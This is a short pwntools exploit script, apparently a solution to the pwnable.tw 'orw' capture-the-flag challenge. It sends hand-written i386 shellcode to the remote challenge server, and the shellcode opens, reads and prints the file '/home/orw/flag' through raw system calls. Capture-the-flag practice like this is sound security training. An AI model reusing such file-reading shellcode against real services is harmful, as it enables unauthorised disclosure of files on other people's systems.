from pwn import *

# p = process('./orw')
p = remote('chall.pwnable.tw', 10001)
context(os = 'linux',arch='i386',log_level='debug')

shellcode = ''
shellcode += asm('''
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov eax, 5
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
mov eax, 3
mov ebx, 3
mov ecx, esp
mov edx, 0x30
int 0x80
mov eax, 4
mov ebx, 1
int 0x80
''')

p.sendlineafter("shellcode:", shellcode)
print(p.recv())